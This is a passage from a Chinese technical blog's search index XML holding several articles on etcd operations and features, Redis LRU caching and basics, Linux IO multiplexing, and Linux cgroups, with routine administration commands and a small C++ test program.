<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[etcd篇——运维指南]]></title>
    <url>%2F2021%2F04%2F07%2Fetcd%E7%AF%87-%E8%BF%90%E7%BB%B4%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[1. etcd集群 1.1 etcd集群简介 etcd为了提高可用性提供了集群模式，集群模式下会选举leader，并通过leader和raft机制保证集群模式下的一致性问题，同一时刻有且仅有一个leader。关于集群模式，需要关注以下： API操作etcd时，不需要关注节点是否是leader，对于需要保证一致性的请求，follower节点会自动转发给leader处理。 集群成员的数目一般是奇数，如果有3个成员，表明集群最大允许挂掉1个节点，如果有5个成员，则最大允许挂掉2个节点。当然节点数目不是越大越好，因为一致性机制下节点数目会影响写性能。 1.2 etcd集群搭建 参考手册：https://blog.lecury.cn/2016/06/27/Etcd集群搭建过程/ 2. etcd运维 集群模式大大提高了etcd的可用性，但是仍存在异常和挂掉的可能性。为了进一步提高稳定性和可用性，可以从以下方面着手。 2.1 etcd operator etcd operator概念最早出现在k8s的生态中，目的是借助k8s平台自动创建、管理etcd集群，不仅提供部署能力，还提供故障迁移的能力。 方案的理念是相似的，是将etcd集群交给一个全局控制器来管理，这个控制器可以运行在k8s平台，也可以独立运行，以提高etcd集群的稳定性和可用性。 2.2 容灾和恢复 目前搜集到的方案大致是： 定期dump数据，推送到分布式存储中。 恢复时，将数据拷到每个节点上然后分别执行restore。 restore的方式 123456789101112131415$ ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \ --name m1 \ --initial-cluster m1=http://host1:2380,m2=http://host2:2380,m3=http://host3:2380 \ --initial-cluster-token etcd-cluster-1 \ --initial-advertise-peer-urls http://host1:2380$ ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \ --name m2 \ --initial-cluster m1=http://host1:2380,m2=http://host2:2380,m3=http://host3:2380 \ --initial-cluster-token etcd-cluster-1 \ --initial-advertise-peer-urls http://host2:2380$ ETCDCTL_API=3 etcdctl snapshot restore snapshot.db \ --name m3 \ --initial-cluster m1=http://host1:2380,m2=http://host2:2380,m3=http://host3:2380 \ --initial-cluster-token etcd-cluster-1 \ --initial-advertise-peer-urls http://host3:2380 然后再启动 123456789101112131415$ etcd \ --name m1 \ --listen-client-urls http://host1:2379 \ --advertise-client-urls http://host1:2379 \ --listen-peer-urls http://host1:2380 &amp;$ etcd \ --name m2 \ --listen-client-urls http://host2:2379 \ --advertise-client-urls http://host2:2379 \ --listen-peer-urls http://host2:2380 &amp;$ etcd \ --name m3 \ --listen-client-urls http://host3:2379 \ --advertise-client-urls http://host3:2379 \ --listen-peer-urls http://host3:2380 &amp; 整体操作还是挺麻烦的，完善的容灾机制需要快、准，最好提供平台化的支持，最终目标是实现一键回滚到某个时间点。 参考：https://etcd.io/docs/v3.3.12/op-guide/recovery/ 2.3 etcd监控和报警 对etcd集群来说，监控和报警是必不可少的，没有机制能够保证100%的可用，我们需要监控和报警及时的发现问题。 etcd内置了很多prometheus metrics，可以通过prometheus+Grafana方便的监控etcd集群。主要监控点包括： 成员状态 集群吞吐 kps snapshot时间 错误情况 内存相关 等等 这里有个etcd监控模板：https://grafana.com/grafana/dashboards/3070 2.4 etcd集群新增节点 如果该节点曾属于集群成员，那么删除etcd data目录，重启即可。可以通过以下方式查看是否是集群成员 1ETCDCTL_API=2 etcdctl member list 如果该节点是一个新的节点，那么启动etcd时， 先在集群节点上执行 etcdctl member add new_node --peer-urls=xxx 设置环境变量ETCD_INITIAL_CLUSTER和ETCD_INITIAL_CLUSTER_STATE：分别指明了etcd的集群地址和集群状态。 启动这个new node 3. 常见问题 3.1 如何选择etcd集群的节点数目？ 首先要理解为什么需要增加节点数目？原因大致为： 提高etcd集群的可用性：3个节点能最大容忍一个节点不可用，5个节点则可以最大容忍2个节点不可用，节点数增加从概率角度上确实能增大集群的可用性。 提高读的吞吐：集群任何一个节点都能提供读的服务，增加节点类似于横向扩展了。 注意节点数并不是越多越好，因为etcd的一致性机制，每次写操作都需要同步到每个节点，节点数越多会降低写操作的吞吐。 在读写均存在的场景下，建议etcd集群有3个节点，如果读远大于写的场景下，可以考虑增加到5个节点。 3.2 etcd内存、snapshot大小异常 大致原因有以下几点： etcd的key/value具有版本功能，频繁更新key/value会使得版本增加过快。 raft log的太多了 golang gc问题 解决办法有： 开启自动compact：启动参数增加--auto-compaction-retention=168 设置存储quota上限: 启动参数增加--quota-backend-bytes=8589934592 限制raft log：调小--snapshot-count=10000 3.3 etcd节点挂掉时间太长，重启失败咋办？ 集群没挂掉的情况下，直接删除data目录，重新加入集群处理。 3.4 mvcc: database space exceeded 报错如何处理？ etcd会保存key的历史版本，如果没有定期compact的话，就会耗尽etcd的存储空间。如果etcd的剩余空间很小的时候，就会报警：mvcc: database space exceeded. 解决办法： compact etcd历史 清理每个etcd endpoint 消除报警 12345recv=`ETCDCTL_API=3 ./etcdctl --endpoints=http://$addr endpoint status --write-out=&quot;json&quot; | egrep -o &apos;&quot;revision&quot;:[0-9]*&apos; | egrep -o &apos;[0-9].*&apos;`ETCDCTL_API=3 ./etcdctl --endpoints=http://$addr compact $recvETCDCTL_API=3 ./etcdctl --endpoints=http://$addr defrag]]></content>
      <tags>
        <tag>etcd</tag>
        <tag>架构设计</tag>
        <tag>配置中心</tag>
        <tag>服务注册</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[etcd篇——基本介绍]]></title>
    <url>%2F2020%2F12%2F27%2Fetcd%E7%AF%87-%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[1. etcd简介 etcd是一个非常可靠的kv存储系统，常在分布式系统中存储着关键的数据。它是由coreos团队开发并开源的分布式键值存储系统，具备以下特点： 简单：提供定义明确且面向用户的API 安全：支持SSL证书验证 性能：基准压测支持1w+/sec写入 可靠：采用Raft协议保证分布式系统数据的可用性和一致性。 etcd的这些特性，使得它常常出现在分布式设计场景下的工具集中。 1.1 etcd常见功能 键值存储、查询功能：支持精准查询、range操作、ttl机制、key版本等。 一致性机制：采用raft协议保证强一致性。 可用性机制：提供集群和leader选举机制。 SSL认证机制。 watch机制。 1.2 etcd常见应用场景 1. 配置中心 etcd是一个分布式的键值存储系统，其优秀的读写性能、一致性和可用性的机制，非常适合用来做配置中心角色。 2. 分布式锁 etcd的强一致性保证，可以用来做分布式场景下的同步机制保证。 3. leader选举组件 分布式场景下，常采用leader-follower模式来保证有状态服务的高可用（即使leader挂掉，其他follower立马补上），比如k8s和kafka partition高可用机制。可以很方便的借助etcd来实现leader选举机制，这里有个leader election实现：https://github.com/willstudy/leaderelection 4. 服务注册与服务发现 为了解决微服务场景下，服务地址的注册和发现问题，和配置中心类似，不同之处在于服务注册和服务发现，还伴随着状态检测。 5. 消息订阅和发布 etcd内置watch机制，完全可以实现一个小型的消息订阅和发布组件。 6. more and more etcd优秀的特性，适合的场景很多。 2. etcd和同类型产品的对比 2.1 etcd vs redis etcd诞生之日起，就定位成一种分布式存储系统，并在k8s 服务注册和服务发现中，为大家所认识。它偏重的是节点之间的通信和一致性的机制保证，并不强调单节点的读写性能。 而redis最早作为缓存系统出现在大众视野，也注定了redis需要更加侧重于读写性能和支持更多的存储模式，它不需要care一致性，也不需要侧重事务，因此可以达到很高的读写性能。 总结一下，redis常用来做缓存系统，etcd常用来做分布式系统中一些关键数据的存储服务，比如服务注册和服务发现。 2.2 etcd vs consul consul定位是一个端到端的服务框架，提供了内置的监控检查、DNS服务等，除此之外，还提供了HTTP API和Web UI，如果要实现简单的服务发现，基本上可以开箱即用。 但是缺点同样也存在，封装有利有弊，就导致灵活性弱了不少。除此之外，consul还比较年轻，暂未在大型项目中实践，可靠性还未可知。 2.3 etcd vs zookeeper etcd站在了巨人的肩膀上。。zookeeper有如下局限性： 不能动态的变更节点，需要人工修改配置 &amp; 重启进程。 大规模链接时，读写性能表现差。 3. etcd性能表现 来自于官网介绍：https://etcd.io/docs/v3.4.0/op-guide/performance/ 大致总结一下： 读：1w ~ 10w 之间 写：1w左右 建议： etcd需要部署到ssd盘（强烈建议） 多个写采用batch操作。 非必要情况下，避免range操作。 etcd集群更偏重一致性和稳定性，并不强调高性能，在绝大部分场景下均不会到达etcd性能瓶颈，如果出现瓶颈的话，需要重新review架构设计，比如拆分或者优化流程。 4. 总结 etcd是一个分布式的可靠的键值存储系统，是分布式架构设计的常见组件。 每个轮子都有好有坏，正是坏的那一点的存在，才能将好的那一点发挥到极致。在架构设计中，需要根据业务场景选择适合的轮子，避免坏的那一面，并将好的那一面发挥到极致。 5. 推荐 https://github.com/etcd-io/etcd https://etcd.io/docs/v3.4.0/]]></content>
      <tags>
        <tag>etcd</tag>
        <tag>架构设计</tag>
        <tag>配置中心</tag>
        <tag>服务注册</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis篇——LRU cache设计指南]]></title>
    <url>%2F2020%2F11%2F14%2Fredis%E7%AF%87-LRU%20cache%E8%AE%BE%E8%AE%A1%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[1. LRU cache是什么？ LRU cache是一个缓存系统，特殊之处在于缓存的容量是有限的，当缓存内容超出预设容量之后，会淘汰最久未访问的缓存内容。 在很多架构设计中，常常出现LRU cache的身影，它是用来平衡成本和缓存命中率矛盾问题，采取的折中思路之一。在有限的缓存容量下，尽可能多的命中缓存内容。 2. 基于redis实现LRU cache redis是开源的、内存型的存储系统，其内置了多种常见的数据类型和丰富的淘汰策略，可以很方便的基于redis实现一个LRU cache系统。redis基本介绍见：https://zhuanlan.zhihu.com/p/132353640 2.1 redis设置cache最大容量 假设限制redis最大cache容量为100mb，那么在redis.conf以下配置： 1maxmemory 100mb 当缓存内容持续上涨，突破到100mb之后，就会触发redis的数据驱除策略。 2.2 redis数据驱除策略 目前redis的数据驱除策略有以下几种： noeviction：不驱除，新增数据会失败，无法再新增缓存。 allkeys-lru: LRU方式驱除，将最久未访问的key清掉、释放空间。 volatile-lru: LRU方式驱除，不同之处在于：只从已经过期的key列表中驱除最久未访问的key。 allkeys-random: 随机驱除。 volatile-random: 从过期的key列表中，随机驱除。 volatile-ttl: 不立马驱除key，只是给key一个更小的ttl（延迟删除）。 备注：对于volatile-lru, volatile-random, volatile-ttl如果没有找到符合条件的key，就不会驱除。 需要根据业务访问场景选择合适的驱除策略，值得一提的是，我们可以在redis运行期间动态修改驱除策略。 不同策略选择原则大致为： allkeys-lru: 请求符合幂律分布，最近访问的元素有大概率被再次访问的场景。 allkeys-random: 所有元素访问频率是相同的场景。 volatile-ttl: 缓存内容均拥有不同的ttl的场景。 2.3 小结 通过为redis设置最大容量和数据LRU驱除策略，就可以很方便的实现一个LRU系统。 3. redis LRU算法简介 redis的LRU算法并不是完全意义上的LRU，它只是一个近似实现，这再一次的体现了工程架构设计中的折中思想。 3.1 redis近似LRU算法 由于LRU算法需要保存每一个元素的访问时间，如果元素数量特别多、频繁驱除的情况下，是非常消耗计算和内存的。为了成本和效果之间的折中，redis实现一个近似的LRU算法。 redis为对key集合进随机抽样，只对抽样集合中的key做LRU算法。样本集合小的情况下，计算和内存会极大降低，但是也会损失一点精度。可以通过这个配置来控制精度： 12# 每次驱除抽样的key数目，越大LRU越精准maxmemory-samples 5 3.2 redis更高级的LFU算法 当maxmemory-samples=10之后就接近真实LRU的效果了，无法继续提升。为了进一步提升命中效果，redis的大佬们又想到了一种办法：LFU（最近不频繁访问的驱除算法，在redis 4.0版本） LRU vs LFU： LRU: 只是针对访问时间，对于最近刚刚访问的冷门数据来说，是需要一段时间才能被驱除掉。 LFU: 实时记录每个key的访问次数，当触发驱除时，只驱除访问频度最低的那些key。 LFU同样提供了两种数据过期策略：volatile-lfu 和 allkeys-lfu，分别是过期集合和全集中选择目标。 除此之外为了控制访问频率计数器的增长和衰弱速度，redis又引入了两个配置: 1234# 增长速度：越大越慢lfu-log-factor 10# 衰减速度: 分钟单位lfu-decay-time 1 LFU思想还是非常值得借鉴的，后面有机会再深入了解一下LFU算法。 4. 总结 redis非常强大，在很多场景中均有不俗的表现，今天主要介绍了LRU cache场景。 redis的配置参数也非常的多，给予了用户非常大的灵活性，如果redis集群很大的情况下，值得折腾一下各个配置，整个玄学调参。]]></content>
      <tags>
        <tag>架构设计</tag>
        <tag>redis</tag>
        <tag>LRU</tag>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis篇——基本介绍]]></title>
    <url>%2F2020%2F04%2F17%2Fredis%E7%AF%87-%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[1. redis概述 1.1 简介 redis是一个开源的、内存型的、支持多种数据结构的存储系统，常用来做缓存、数据库、消息代理，除此之外，它还支持数据持久化存储，支持集群化的协同方式，项目地址：https://github.com/antirez/redis 在很多项目中，都有redis的身影，它扮演着多样的角色，发挥了重要的作用。架构师的职责之一就是技术选型，了解redis的原理、特点、优势和不足，是成为架构师必不可少的一环。 1.2 redis功能 redis提供了如下功能： 提供了基于key-value的查询/存储/watch/过期等功能 支持String/Hash/List/Set/Zset等类型的存储结构。 支持数据持久化操作。 提供Pub/Sub的机制 支持集群模式、支持主从节点数据复制等 redis具有丰富的功能，还提供了各种语言的API，入门门槛较低，可以低成本的嵌入到各类项目中。 1.3 应用场景 这里简单说一下redis的几个应用场景。 缓存系统 redis具有非常优秀的读写性能，常用作缓存cache系统，用来提高系统负载能力和响应速度。 分布式锁 redis支持setnx操作（即key不存在的情况下设置value），这种特性常用来做分布式锁的实现。 配置中心 redis提供key/value的查询、存储机制，也提供了watch机制，可以很方便的实现一个配置中心。 消息系统 redis的Pub/Sub功能用作简单的消息系统 分布式场景 redis不仅支持数据持久化，还支持集群化的协同方式，这些特性很好的支持了分布式设计的一些要求（支持扩容和高可用）。 排行榜、热搜、秒杀等 redis内置一些数据结构，可以很方便的解决各式各样的热点数据访问问题。 2. redis优点 2.1 高性能 redis是基于内存型的数据存储系统，所以读写性能非常优秀，读写qps能达到10w左右（写稍微慢一些）。 2.2 高可用 redis支持数据持久化和集群化的操作方式，通过搭建redis集群和实现数据迁移，来提高可用性。 2.3 易用性 redis对外暴露的接口非常简单，不经提供了客户端工具，还支持了多种语言的client api，接入成本很低。 2.4 支持丰富的数据数据结构 redis的value，除了常规的string之外，还支持List/Set/Zset等数据结构，丰富的数据类型能支持更加多样的存储和查询场景。比如秒杀系统、排行榜等 2.5 支持事务级、原子级操作 redis支持事务级操作，即将多个命令打包一起执行，还支持原子性操作。 3 redis劣势 3.1 成本高昂 成本高昂是redis的最大痛点，一方面redis强依赖于RAM，设计大容量的缓存系统，需要很多台机器；另一方面redis也消耗CPU资源，无法进行混部（消耗CPU、低内存占用的服务），导致redis只能独占机器，成本高昂。 3.2 持久化做的不好（影响性能） RDB和AOF两种持久化方式各有优缺点。 3.3 存在内存碎片问题 3.4 key的索引较为简单，无法支持scan等查询操作 4. 总结 技术选型是架构师必备的技能之一，应对复杂的业务场景，结合公司当前所处的情况，如何更好的解决问题、实现需求，非常考验一个架构师的功底。 本文简单的介绍了redis的基本特性和优缺点对比，并列举了一些常见的应用场景，希望能为以后的架构决策有所帮助。]]></content>
      <tags>
        <tag>架构设计</tag>
        <tag>redis</tag>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Linux IO复用]]></title>
    <url>%2F2019%2F11%2F20%2F%E6%B5%85%E8%B0%88Linux%20IO%E5%A4%8D%E7%94%A8%2F</url>
    <content type="text"><![CDATA[1. Linux IO简介 1.1 IO概述 IO是Input、Output的简称，也就是输入和输出。在计算机世界中，除了计算和存储，剩下的几乎都是IO，它包含硬件设备层面的数据交换，也包含软件层面的数据传输。 1.2 Linux IO方式 Linux IO方式表示Linux系统处理IO事件的方式，IO事件包括可读事件、可写事件、错误事件等。Linux IO方式主要包括： 阻塞IO：在IO事件发生之前，会一直阻塞。 非阻塞IO：如果没有IO事件，直接返回错误。 IO多路复用：同时监听多个描述符的IO事件，取出状态ready的描述符列表。 异步IO：为IO事件绑定处理程序，当事件发生时触发处理程序。 信号驱动IO：利用Linux的信号机制，当IO事件发生时，触发信号处理程序。 等。 2. IO复用 2.1 概念 IO复用（I/O Multiplexing）通俗的来说：是同时处理多个描述符IO事件的一种技术手段。这些文件描述符包括：socket套接字、普通文件、设备文件等。 举个简单例子：tcp server同时处理两个文件描述符，一个是标准输入，一个是tcp连接。当server接收标准输入时，可能会因调用fgets()而阻塞，从而无法及时处理另一个tcp连接的可读事件，比如有tcp client发送了数据。 如果tcp server想要同时处理多个描述符的事件，可能的做法是开启多个线程或进程，各自等待描述符的可读可写事件，但这样一来，就需要引入线程间同步和通信问题，大大增加编程的复杂性。 但IO复用技术的出现，可以很好的解决上述问题，它直接管理多个描述符，选出IO事件ready的描述符列表。这种操作方式允许应用程序以较低的成本、较高的效率，同时管理多个描述符的IO事件。 在Linux中，以下接口可以实现IO多路复用： select poll epoll 2.2 select select函数的函数签名如下： 1int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); 它监听一组描述符，并在指定时间内选出可读、可写或者异常的描述符列表。参数介绍如下； timeout：select函数执行的时间，在这个时间范围内选出ready的描述符列表。 readfds、writefds、exceptfds：关心的描述符集合的指针，包括可读、可写、异常的描述符集合。可以通过FD_ISSET宏来判断描述符是否ready。 nfds：监听的描述符集合的最大值+1，类似于描述符范围的上限。 大致处理过程： 将用户空间的fdsets拷贝到内核空间，并分配结果buffer。 遍历fdsets所有fd，找到对应的文件对象file指针，通过poll()检查描述符的事件是否满足条件。 检查超时、遍历完后，将满足条件的fd放入结果buffer中。 拷贝结果到用户空间，并释放之前申请的内存。 2.3 poll poll和select的原理没啥本质不同，只是实现的方式更加优雅，封装了很多细节。其函数签名如下： 12345678#include &lt;poll.h&gt;int poll(struct pollfd fds[], nfds_t nfds, int timeout);struct pollfd &#123; int fd; short events; short revents;&#125;; 将监听的描述符以数组的方式传入，并为每个描述符绑定了监听事件。 2.4 epoll select和poll在描述符集合量级较小的情况下，性能表现还可以，但如果监听的描述符集合太大，就需要考虑epoll了。epoll的用法如下： 创建epoll的句柄，size是监听描述符的个数。 1int epoll_create(int size)； 对监听的描述符操作 1int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)； 参数解释如下： epfd: epoll_create返回的句柄 op: 标识操作类型 EPOLL_CTL_ADD: 添加 EPOLL_CTL_DEL: 删除 EPOLL_CTL_MD: 修改 fd: 文件描述符 event: 需要监听的事件。 监听事件的发生 1int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout); epfd：等待epfd上的io事件，最多返回maxevents个事件 events：用来从内核得到事件的集合 maxevents：events数量，该maxevents值不能大于创建epoll_create()时的size timeout：超时时间（毫秒，0会立即返回） epoll有两种工作模式 LT（水平触发，默认）：当时间发生时，如果用户不处理的话，内核会一直通知此事件。 ET（垂直触发）：只有当事件状态发生改变时，内核才会通知。（如果描述符缓冲区还有未处理的数据，内核下次不会再通知了，因为状态没有发生改变） epoll的工作处理流程，大致如下： 当新增描述符监听时，也就是调用EPOLL_CTL_ADD，内核会将初始化一个epitem（保存fd、监听事件等等），插入到红黑树中，并将回调函数ep_poll_callback通过vfs_poll注册到描述符的等待队列中。 当描述符ready后，会调用回调函数ep_poll_callback，它会将描述符对应的epitem拷贝到rdllist中。 调用epoll_wait其实是检查rdllist的过程。 2.5 select vs epoll 从工作原理中，也可以看出select与epoll的诸多不同，优缺点对比如下： 支持监听的描述符数量 select支持的描述符数量受限：因为需要遍历描述符列表、多次用户空间到内核空间的内存拷贝。 epoll可以支撑监听海量的描述符。 性能 select随着描述符数量的增多，性能下降严重，时间复杂度 &gt; O(n)。 epoll通过回调函数的方式，在描述符增长的情况下，依旧有出色的性能。 使用场景 select使用方式较为简单，适用于描述符量级小的情况。 epoll适用于同时监听大量的描述符。 3. 总结 IO模式多种多样，在软件开发过程中，不能唯一而论，要根据实际的应用场景，选择合适的IO技术，才能取得事半功倍的效果。]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>内核</tag>
        <tag>IO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Linux Cgroups机制]]></title>
    <url>%2F2019%2F09%2F08%2F%E6%B5%85%E8%B0%88Linux%20Cgroups%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[1. cgroups简介 1.1 功能和定位 Cgroups全称Control Groups，是Linux内核提供的物理资源隔离机制，通过这种机制，可以实现对Linux进程或者进程组的资源限制、隔离和统计功能。比如可以通过cgroup限制特定进程的资源使用，比如使用特定数目的cpu核数和特定大小的内存，如果资源超限的情况下，会被暂停或者杀掉。 Cgroup是于2.6内核由Google公司主导引入的，它是Linux内核实现资源虚拟化的技术基石，LXC(Linux Containers)和docker容器所用到的资源隔离技术，正是Cgroup。 1.2 相关概念介绍 任务(task): 在cgroup中，任务就是一个进程。 控制组(control group): cgroup的资源控制是以控制组的方式实现，控制组指明了资源的配额限制。进程可以加入到某个控制组，也可以迁移到另一个控制组。 层级(hierarchy): 控制组有层级关系，类似树的结构，子节点的控制组继承父控制组的属性(资源配额、限制等)。 子系统(subsystem): 一个子系统其实就是一种资源的控制器，比如memory子系统可以控制进程内存的使用。子系统需要加入到某个层级，然后该层级的所有控制组，均受到这个子系统的控制。 概念间的关系： 子系统可以依附多个层级，当且仅当这些层级没有其他的子系统，比如两个层级同时只有一个cpu子系统，是可以的。 一个层级可以附加多个子系统。 一个任务可以是多个cgroup的成员，但这些cgroup必须位于不同的层级。 子进程自动成为父进程cgroup的成员，可按需求将子进程移到不同的cgroup中。 cgroup关系图如下： 两个任务组成了一个 Task Group，并使用了 CPU 和 Memory 两个子系统的 cgroup，用于控制 CPU 和 MEM 的资源隔离。 1.3 子系统 cpu: 限制进程的 cpu 使用率。 cpuacct 子系统，可以统计 cgroups 中的进程的 cpu 使用报告。 cpuset: 为cgroups中的进程分配单独的cpu节点或者内存节点。 memory: 限制进程的memory使用量。 blkio: 限制进程的块设备io。 devices: 控制进程能够访问某些设备。 net_cls: 标记cgroups中进程的网络数据包，然后可以使用tc模块（traffic control）对数据包进行控制。 net_prio: 限制进程网络流量的优先级。 huge_tlb: 限制HugeTLB的使用。 freezer:挂起或者恢复cgroups中的进程。 ns: 控制cgroups中的进程使用不同的namespace。 1.4 cgroups文件系统 Linux通过文件的方式，将cgroups的功能和配置暴露给用户，这得益于Linux的虚拟文件系统（VFS）。VFS将具体文件系统的细节隐藏起来，给用户态提供一个统一的文件系统API接口，cgroups和VFS之间的链接部分，称之为cgroups文件系统。 比如挂在 cpu、cpuset、memory 三个子系统到 /cgroups/cpu_mem 目录下 1mount -t cgroup -o cpu,cpuset,memory cpu_mem /cgroups/cpu_mem 关于虚拟文件系统机制，见浅谈Linux虚拟文件系统机制 2. cgroups子系统 这里简单介绍几个常见子系统的概念和用法，包括cpu、cpuacct、cpuset、memory、blkio。 2.1 cpu子系统 cpu子系统限制对CPU的访问，每个参数独立存在于cgroups虚拟文件系统的伪文件中，参数解释如下： cpu.shares: cgroup对时间的分配。比如cgroup A设置的是1，cgroup B设置的是2，那么B中的任务获取cpu的时间，是A中任务的2倍。 cpu.cfs_period_us: 完全公平调度器的调整时间配额的周期。 cpu.cfs_quota_us: 完全公平调度器的周期当中可以占用的时间。 cpu.stat 统计值 nr_periods 进入周期的次数 nr_throttled 运行时间被调整的次数 throttled_time 用于调整的时间 2.2 cpuacct子系统 子系统生成cgroup任务所使用的CPU资源报告，不做资源限制功能。 cpuacct.usage: 该cgroup中所有任务总共使用的CPU时间（ns纳秒） cpuacct.stat: 该cgroup中所有任务总共使用的CPU时间，区分user和system时间。 cpuacct.usage_percpu: 该cgroup中所有任务使用各个CPU核数的时间。 通过cpuacct如何计算CPU利用率呢？可以通过cpuacct.usage来计算整体的CPU利用率，计算如下： 1234567891011# 1. 获取当前时间（纳秒）tstart=$(date +%s%N)# 2. 获取cpuacct.usagecstart=$(cat /xxx/cpuacct.usage)# 3. 间隔5s统计一下sleep 5# 4. 再次采点tstop=$(date +%s%N)cstop=$(cat /xxx/cpuacct.usage)# 5. 计算利用率($cstop - $cstart) / ($tstop - $tstart) * 100 2.3 cpuset子系统 适用于分配独立的CPU节点和Mem节点，比如将进程绑定在指定的CPU或者内存节点上运行，各参数解释如下： cpuset.cpus: 可以使用的cpu节点 cpuset.mems: 可以使用的mem节点 cpuset.memory_migrate: 内存节点改变是否要迁移？ cpuset.cpu_exclusive: 此cgroup里的任务是否独享cpu？ cpuset.mem_exclusive： 此cgroup里的任务是否独享mem节点？ cpuset.mem_hardwall: 限制内核内存分配的节点（mems是用户态的分配） cpuset.memory_pressure: 计算换页的压力。 cpuset.memory_spread_page: 将page cache分配到各个节点中，而不是当前内存节点。 cpuset.memory_spread_slab: 将slab对象(inode和dentry)分散到节点中。 cpuset.sched_load_balance: 打开cpu set中的cpu的负载均衡。 cpuset.sched_relax_domain_level: the searching range when migrating tasks cpuset.memory_pressure_enabled: 是否需要计算 memory_pressure? 2.4 memory子系统 memory子系统主要涉及内存一些的限制和操作，主要有以下参数： memory.usage_in_bytes # 当前内存中的使用量 memory.memsw.usage_in_bytes # 当前内存和交换空间中的使用量 memory.limit_in_bytes # 设置or查看内存使用量 memory.memsw.limit_in_bytes # 设置or查看 内存加交换空间使用量 memory.failcnt # 查看内存使用量被限制的次数 memory.memsw.failcnt # - 查看内存和交换空间使用量被限制的次数 memory.max_usage_in_bytes # 查看内存最大使用量 memory.memsw.max_usage_in_bytes # 查看最大内存和交换空间使用量 memory.soft_limit_in_bytes # 设置or查看内存的soft limit memory.stat # 统计信息 memory.use_hierarchy # 设置or查看层级统计的功能 memory.force_empty # 触发强制page回收 memory.pressure_level # 设置内存压力通知 memory.swappiness # 设置or查看vmscan swappiness 参数 memory.move_charge_at_immigrate # 设置or查看 controls of moving charges? memory.oom_control # 设置or查看内存超限控制信息(OOM killer) memory.numa_stat # 每个numa节点的内存使用数量 memory.kmem.limit_in_bytes # 设置or查看 内核内存限制的硬限 memory.kmem.usage_in_bytes # 读取当前内核内存的分配 memory.kmem.failcnt # 读取当前内核内存分配受限的次数 memory.kmem.max_usage_in_bytes # 读取最大内核内存使用量 memory.kmem.tcp.limit_in_bytes # 设置tcp 缓存内存的hard limit memory.kmem.tcp.usage_in_bytes # 读取tcp 缓存内存的使用量 memory.kmem.tcp.failcnt # tcp 缓存内存分配的受限次数 memory.kmem.tcp.max_usage_in_bytes # tcp 缓存内存的最大使用量 2.5 blkio子系统 - block io 主要用于控制设备IO的访问。有两种限制方式：权重和上限，权重是给不同的应用一个权重值，按百分比使用IO资源，上限是控制应用读写速率的最大值。 按权重分配IO资源： blkio.weight：填写 100-1000 的一个整数值，作为相对权重比率，作为通用的设备分配比。 blkio.weight_device： 针对特定设备的权重比，写入格式为 device_types:node_numbers weight，空格前的参数段指定设备，weight参数与blkio.weight相同并覆盖原有的通用分配比。 按上限限制读写速度： blkio.throttle.read_bps_device：按每秒读取块设备的数据量设定上限，格式device_types:node_numbers bytes_per_second。 blkio.throttle.write_bps_device：按每秒写入块设备的数据量设定上限，格式device_types:node_numbers bytes_per_second。 blkio.throttle.read_iops_device：按每秒读操作次数设定上限，格式device_types:node_numbers operations_per_second。 blkio.throttle.write_iops_device：按每秒写操作次数设定上限，格式device_types:node_numbers operations_per_second 针对特定操作 (read, write, sync, 或 async) 设定读写速度上限 blkio.throttle.io_serviced：针对特定操作按每秒操作次数设定上限，格式device_types:node_numbers operation operations_per_second blkio.throttle.io_service_bytes：针对特定操作按每秒数据量设定上限，格式device_types:node_numbers operation bytes_per_second 3. cgroups的安装和使用 测试环境为 ubuntu 18.10 3.1 cgroups的安装 安装 cgroups 1sudo apt install cgroup-bin 安装完成后，系统会出现该目录/sys/fs/cgroup。 创建cpu资源控制组，限制cpu使用率最大为50% 1234$ cd /sys/fs/cgroup/cpu$ sudo mkdir test_cpu$ sudo echo &apos;10000&apos; &gt; test_cpu/cpu.cfs_period_us$ sudo echo &apos;5000&apos; &gt; test_cpu/cpu.cfs_quota_us 创建mem资源控制组，限制内存最大使用为100MB 123$ cd /sys/fs/cgroup/memory$ sudo mkdir test_mem$ sudo echo &apos;104857600&apos; &gt; test_mem/memory.limit_in_bytes 3.2 将进程加入到资源限制组 测试代码test.cc如下： 1234567891011121314151617181920212223242526272829303132#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;cstring&gt;#include &lt;thread&gt;void test_cpu() &#123; printf(&quot;thread: test_cpu start\n&quot;); int total = 0; while (1) &#123; ++total; &#125;&#125;void test_mem() &#123; printf(&quot;thread: test_mem start\n&quot;); int step = 20; int size = 10 * 1024 * 1024; // 10Mb for (int i = 0; i &lt; step; ++i) &#123; char* tmp = new char[size]; memset(tmp, i, size); sleep(1); &#125; printf(&quot;thread: test_mem done\n&quot;);&#125;int main(int argc, char** argv) &#123; std::thread t1(test_cpu); std::thread t2(test_mem); t1.join(); t2.join(); return 0;&#125; 1. 编译该程序 1g++ -o test test.cc --std=c++11 -lpthread 2. 观察限制之前的运行状态 3. 测试cpu的限制 1cgexec -g cpu:test_cpu ./test cpu使用率降低了一半。 除了使用 cgexec 限制进程外，还可以通过将进程号加入到cgroup.procs的方式，来达到限制目的。 4. 总结 本文简单介绍了Cgroups的概念和使用，通过Cgroups可以实现资源限制和隔离。在实际的生产环境中，Cgroups技术被大量应用在各种容器技术中，包括docker、rocket等。 这种资源限制和隔离技术的出现，使得模块间相互混部成为可能，大大提高了机器资源利用率，这也是云计算的关键技术之一。 5. 参考 CGroup 介绍、应用实例及原理描述 Linux资源管理之cgroups简介 Linux内核文档]]></content>
      <tags>
